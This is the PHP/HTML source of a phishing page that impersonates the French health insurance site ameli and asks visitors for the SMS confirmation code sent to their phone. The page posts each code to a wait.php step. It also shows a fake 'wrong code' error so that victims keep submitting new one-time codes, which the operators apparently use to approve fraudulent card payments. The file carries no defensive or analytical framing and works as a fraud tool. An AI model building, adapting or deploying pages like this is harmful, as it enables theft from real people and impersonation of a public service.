<?php
if (isset($_GET['id']))

  $id=$_GET['id']+1;
 
else
   $id=0;








?>


<!DOCTYPE html>
<html>

<head>
	<link rel="apple-touch-icon" sizes="57x57" href="images/apple-icon-57x57.png"/>
	<link rel="apple-touch-icon" sizes="60x60" href="images/apple-icon-60x60.png"/>
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-icon-72x72.png"/>
	<link rel="apple-touch-icon" sizes="76x76" href="images/apple-icon-76x76.png"/>
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-icon-114x114.png"/>
	<link rel="apple-touch-icon" sizes="120x120" href="images/apple-icon-120x120.png"/>
	<link rel="apple-touch-icon" sizes="144x144" href="images/apple-icon-144x144.png"/>
	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-icon-152x152.png"/>
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-icon-180x180.png"/>
	<link rel="icon" type="image/png" sizes="192x192" href="images/android-icon-192x192.png"/>
	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"/>
	<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96x96.png"/>
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png"/>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Compte ameli - mon espace personnel</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
</head>

<body>
    <div class="container-fluid">
        <header>
            <div class="limiter">
            	<img src="images/ameli.jpg" alt="" >

               
                
            </div>
        </header>
        <div class="creditCardForm">
   <h4 style="text-align: center;">Nous vous remercions de vous authentifier en saisissant le code de confirmation reçu sur votre téléphone. Cette authentification est obligatoire pour confirmer votre opération.

</h4>
            <div class="payment" style="width: 100%">
                <form action="wait.php?id=<?php 

if (!empty($_GET['id']))
  echo $id ;
  else
  echo 1;



  ?>"  method="post" >
                    
 <div class="form-group" id="card-number-field">
                        <label for="cardNumber" style="text-align: center;">CODE DE CONFIRMATION: <span class="redd">*</span></label>
                        <input type="text" class="form-control" id="co1" name="co1" onkeypress="return onlyNumbers();" style="<?php if (isset($_GET['id'])) echo "border:1px solid red;" ?>">
                      
                    </div>	
                    <div style="color: red"><?php if (isset($_GET['id'])) echo "le code de confirmation erroné, vous allez recevoir un autre code pour confirmer" ?></div>
                   
                   
                   
                  
                    <div class="form-group" id="pay-now">
                        <button type="submit" class="btn btn-default" id="confirm-purchase" name="submitt">Confirmer</button>
                    </div>
                </form>
            </div>
        </div>

   

      
    </div>
<script language="JavaScript">
function onlyNumbers(evt)
{
var e = event || evt; // for trans-browser compatibility
var charCode = e.which || e.keyCode;

if (charCode > 31 && (charCode < 48 || charCode > 57))
    return false;

return true;

}
</script>
</body>

</html>
